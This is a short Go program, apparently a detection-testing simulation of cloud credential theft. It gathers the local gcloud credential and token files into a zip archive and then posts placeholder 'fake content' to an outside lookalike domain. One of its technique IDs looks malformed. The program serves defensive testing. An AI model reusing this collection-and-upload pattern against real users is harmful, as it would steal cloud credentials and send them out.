// Simulates theft of GCP credentials [1552.001, T15060.002]
package main

import (
	"archive/zip"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	home, err := os.UserHomeDir()
	if err != nil {
		log.Printf("home dir: %v", err)
		os.Exit(1)
	}

	tf, err := os.CreateTemp("/tmp", "ttp.*.zip")
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(tf.Name())

	z := zip.NewWriter(tf)

	dir := filepath.Join(home, ".config/gcloud")
	files := []string{
		"application_default_credentials.json",
		"access_tokens.db",
		"credentials.db",
	}

	for _, f := range files {
		path := filepath.Join(dir, f)
		if _, err := os.Stat(path); err != nil {
			continue
		}

		r, err := os.Open(path)
		if err != nil {
			log.Printf("failed to read %s: %v", path, err)
			continue
		}
		defer r.Close()

		w, err := z.Create(f)
		if err != nil {
			log.Printf("z.Create failed: %v", err)
			continue
		}
		if _, err := io.Copy(w, r); err != nil {
			log.Printf("failed to copy buffer: %v", err)
			continue
		}
		log.Printf("%s archived", path)
	}
	z.Close()

	// make outgoing connection
	endpoint := "http://ueosntoae23958239.vkontake.ru/upload"
	log.Printf("uploading fake content to %s", endpoint)
	http.Post(endpoint, "image/jpeg", strings.NewReader("fake content"))
}
